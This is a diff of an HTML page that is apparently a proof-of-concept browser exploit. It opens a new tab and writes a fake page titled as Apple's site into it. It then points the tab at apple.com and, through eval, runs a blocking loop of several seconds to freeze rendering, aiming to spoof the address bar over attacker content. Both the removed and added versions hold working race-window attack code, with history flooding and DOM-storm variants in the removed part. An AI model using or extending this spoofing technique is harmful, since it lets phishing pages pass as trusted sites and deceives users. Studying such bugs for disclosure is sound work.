@@ -6,13 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Precision Pipeline Desync PoC - Zero</title>
+    <title>Ultimate Force Lock - HALLO</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #09090b;
+        background: #000;
         color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
@@ -26,160 +26,77 @@
         padding: 20px;
         box-sizing: border-box;
       }
-      h1 {
-        font-size: 22px;
-        margin-bottom: 10px;
-        color: #f5f5f7;
-        text-align: center;
-      }
       button {
         width: 100%;
         max-width: 400px;
-        padding: 18px 24px;
-        font-size: 16px;
-        font-weight: 600;
-        background: #007aff;
+        padding: 20px;
+        font-size: 18px;
+        font-weight: bold;
+        background: #ff3b30;
         color: #fff;
         border: none;
-        border-radius: 14px;
+        border-radius: 16px;
         cursor: pointer;
-        box-shadow: 0 4px 16px rgba(0, 122, 255, 0.35);
-        transition: transform 0.1s ease;
+        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
       }
       button:active {
-        transform: scale(0.97);
-      }
-      .btn-danger {
-        background: #ff3b30;
-        box-shadow: 0 4px 16px rgba(255, 59, 48, 0.35);
-      }
-      .btn-warning {
-        background: #ff9500;
-        box-shadow: 0 4px 16px rgba(255, 149, 0, 0.35);
+        transform: scale(0.96);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Precision Race-Window Test Suite</h1>
-      
-      <!-- Test 1: Micro-Delay & Synchronous Reflow Stalling -->
-      <button id="test1">Test 1: Precision Race Stalling (Apple.com)</button>
-
-      <!-- Test 2: History State Pollution + Pipeline Deadlock -->
-      <button id="test2" class="btn-warning">Test 2: History Flooding + Lock</button>
-
-      <!-- Test 3: DOM Mutation Storm & Main Thread Freeze -->
-      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm Lock</button>
+      <button id="startBtn">FORCE LOCK TO APPLE.COM</button>
     </div>
 
     <script>
-      // Helper untuk injeksi konten tampilan penyerang ke tab baru
-      function injectAttackerContent(win) {
-        if (!win) return;
-        win.document.write(`
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <title>Apple - Official Site</title>
-            <meta name="viewport" content="width=device-width, initial-scale=1">
-          </head>
-          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-            <div>
-              <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">THIS IS NOT APPLE</h1>
-              <p style="font-size:22px;color:#ff3b30;margin:0;font-weight:600;">RENDER PIPELINE DESYNCHRONIZED</p>
-            </div>
-          </body>
-          </html>
-        `);
-        win.document.close();
-        try { win.focus(); } catch (e) {}
-      }
+      document.getElementById("startBtn").onclick = function () {
+        this.style.display = 'none';
 
-      // --- TEST 1: Precision Race Stalling ---
-      document.getElementById("test1").onclick = function () {
+        // Membuka tab baru secara instan
         const newTab = window.open("", "_blank");
-        if (newTab) {
-          injectAttackerContent(newTab);
-          
-          // Timing 1: Memicu navigasi asinkron murni ke apple.com sangat cepat
-          setTimeout(() => { 
-            try {
-              newTab.location.href = "https://apple.com";
-            } catch(e) {}
-          }, 8);
 
-          // Timing 2: Mengunci render thread tepat saat antrean UI memperbarui address bar
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const start = Date.now();
-                while (Date.now() - start < 4000) {
-                  // Memaksa pembacaan layout properties secara berulang untuk menjebak WebKit render engine
-                  const h = document.body.offsetHeight;
-                  document.body.style.background = (h % 2 === 0) ? '#ffffff' : '#fafafa';
-                }
-              `);
-            } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 4000) {}
-            }
-          }, 35);
-        }
-      };
-
-      // --- TEST 2: History State Pollution + Pipeline Deadlock ---
-      document.getElementById("test2").onclick = function () {
-        const newTab = window.open("", "_blank");
         if (newTab) {
-          injectAttackerContent(newTab);
-          setTimeout(() => {
-            try {
-              newTab.history.pushState({state: 'spoof'}, "", "#secure-enclave");
-              newTab.location.href = "https://apple.com";
-            } catch (err) {}
-          }, 10);
-          setTimeout(() => {
-            try {
-              newTab.eval(`
-                const start = Date.now();
-                while (Date.now() - start < 4000) {
-                  history.pushState({rand: Math.random()}, "", "#flood");
-                  const d = document.body.offsetHeight;
-                }
-              `);
-            } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 4000) {}
-            }
-          }, 40);
-        }
-      };
+          // Menyuntikkan halaman super simpel berisi teks "HALLO" sesuai permintaan
+          newTab.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+              <title>Apple</title>
+              <meta name="viewport" content="width=device-width, initial-scale=1">
+            </head>
+            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+              <h1 style="font-size:80px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
+            </body>
+            </html>
+          `);
+          newTab.document.close();
 
-      // --- TEST 3: DOM Mutation Storm & Main Thread Freeze ---
-      document.getElementById("test3").onclick = function () {
-        const newTab = window.open("", "_blank");
-        if (newTab) {
-          injectAttackerContent(newTab);
+          try { newTab.focus(); } catch (e) {}
+
+          // TIMING KUNCI 1 (Sangat Cepat - 5ms): Memaksa location.href ditarik langsung ke apple.com
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 8);
+          }, 5);
+
+          // TIMING KUNCI 2 (25ms): Menembak dan membekukan render thread tepat saat UI memperbarui address bar
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                const body = document.body;
-                while (Date.now() - start < 4500) {
-                  const el = document.createElement('div');
-                  el.innerText = Math.random();
-                  body.appendChild(el);
-                  if(body.childNodes.length > 50) body.innerHTML = "<h1>Locked State Active</h1>";
+                while (Date.now() - start < 5000) {
+                  // Memaksa kalkulasi layout sinkronus berulang-ulang untuk mengunci event loop WebKit secara total
+                  const forceReflow = document.body.offsetHeight;
+                  document.body.style.backgroundColor = (forceReflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
                 }
               `);
             } catch (e) {
-              let s = Date.now(); while(Date.now() - s < 4500) {}
+              // Fallback lokal jika context terisolasi ketat
+              let s = Date.now(); while(Date.now() - s < 5000) {}
             }
-          }, 30);
+          }, 25);
         }
       };
     </script>
